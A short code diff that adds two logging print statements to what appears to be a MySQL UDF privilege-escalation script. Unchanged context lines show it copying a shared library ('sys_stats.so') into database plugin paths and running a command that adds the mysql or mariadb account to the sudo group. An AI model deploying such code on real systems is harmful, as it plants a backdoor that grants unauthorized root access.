@@ -7,7 +7,8 @@ def deploy_udf():
     ]
 
     for path in paths:
-        if file.is_dir(path): 
+        if file.is_dir(path):
+            print("Deploying UDF to " + path)
             assets.copy("assets/sys_stats.so", path) 
             return True
 
@@ -34,6 +35,7 @@ def add_sudo_user():
     sys.shell("usermod -aG sudo mysql || usermod -aG sudo mariadb")
 
 def main():
+    print("Deploying UDF to MySQL")
     if deploy_udf():
         print("Deployed UDF")
         if is_using_systemd():
